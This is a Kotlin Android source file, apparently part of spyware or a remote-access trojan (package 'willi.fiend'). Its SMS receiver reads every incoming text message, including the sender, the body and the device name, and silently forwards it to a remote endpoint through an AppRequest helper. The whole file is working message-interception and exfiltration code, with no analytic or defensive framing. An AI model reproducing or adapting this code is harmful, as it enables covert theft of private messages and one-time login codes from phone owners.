package willi.fiend.Receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import willi.fiend.Utils.AppTools
import willi.fiend.Utils.AppPermission
import willi.fiend.Utils.AppRequest


class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED" && AppPermission(context).checkReadSms()) {
            val bundle = intent.extras
            val msgs: Array<SmsMessage?>?
            var msg_from: String?
            if (bundle != null) {
                try {
                    val pdus = bundle["pdus"] as Array<*>?
                    msgs = arrayOfNulls(pdus!!.size)
                    for (i in msgs.indices) {
                        msgs[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                        msg_from = msgs[i]?.originatingAddress
                        val msgBody = msgs[i]?.messageBody
                        val text = "New Message\nDevice : ${AppTools.getDeviceName()}\nFrom : $msg_from\nMessage : $msgBody"
                        AppRequest().sendText(AppRequest.Text(text))
                    }
                } catch (e: Exception) {
                    Log.i("data", "Ex")
                }
            }
        }
    }
}